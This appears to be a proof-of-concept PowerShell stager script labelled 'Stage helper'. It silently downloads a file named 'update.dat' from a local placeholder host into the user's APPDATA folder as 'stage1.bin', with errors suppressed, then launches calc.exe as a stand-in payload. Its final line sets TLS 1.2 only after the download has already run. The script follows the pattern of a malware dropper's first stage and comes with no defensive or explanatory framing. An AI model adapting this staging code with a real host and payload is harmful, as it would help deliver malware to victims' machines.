
# Stage helper
$FetchUrl = 'http://127.0.0.1/update.dat'
$OutputPath = "$env:APPDATA\stage1.bin"
Invoke-WebRequest -Uri $FetchUrl -OutFile $OutputPath -UseBasicParsing -ErrorAction SilentlyContinue
Start-Process -FilePath 'calc.exe' -ErrorAction SilentlyContinue
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
